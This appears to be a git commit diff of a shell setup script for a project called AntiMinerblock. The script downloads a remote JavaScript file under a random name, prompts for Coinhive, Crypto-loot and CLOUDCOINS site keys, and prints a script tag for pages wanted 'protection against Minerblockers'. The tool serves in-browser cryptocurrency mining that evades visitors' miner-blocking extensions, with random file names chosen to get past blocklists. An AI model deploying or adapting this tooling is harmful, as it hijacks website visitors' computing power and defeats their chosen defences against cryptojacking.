63c85c88543fe98a3a7eb0410717770078e40ba1
SkyrisBactera <davis.davalos.delosh@gmail.com>
2017-11-23 14:10:21 -0700

    Rewrite

--- setup.sh
+++ setup.sh
@@ -1,14 +1,17 @@
-echo Generating random file names...
-coinhive=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
-authminer=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
+echo Generating random file name...
 minerblock=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
-echo Downloading scripts...
-wget -O $coinhive http://coinhive.com/lib/coinhive.min.js >/dev/null 2>/dev/null
-wget -O $authminer https://authedmine.com/lib/authedmine.min.js >/dev/null 2>/dev/null
+echo Downloading script...
 wget -O $minerblock https://cdn.rawgit.com/SkyrisBactera/AntiMinerblock/master/minerblock.js >/dev/null 2>/dev/null
-echo Substituting the filenames into $minerblock...
-sed -i 's/coinSUB/'$coinhive'/g' $minerblock
-sed -i 's/authSUB/'$authminer'/g' $minerblock
+echo What is your Coinhive site key?
+read cHiveKey
+echo What is your Crypto-loot site key?
+read cLootKey
+echo What is your CLOUDCOINS site key?
+read cCoinsKey
+echo Substituting the keys into $minerblock...
+sed -i 's/cHive/'$cHiveKey'/g' $minerblock
+sed -i 's/cLoot/'$cLootKey'/g' $minerblock
+sed -i 's/cCoins/'$cCoinsKey'/g' $minerblock
 
 echo Put the following into your HTML files that you want to have protection against Minerblockers:
 echo '<script src="'$minerblock'"></script>'
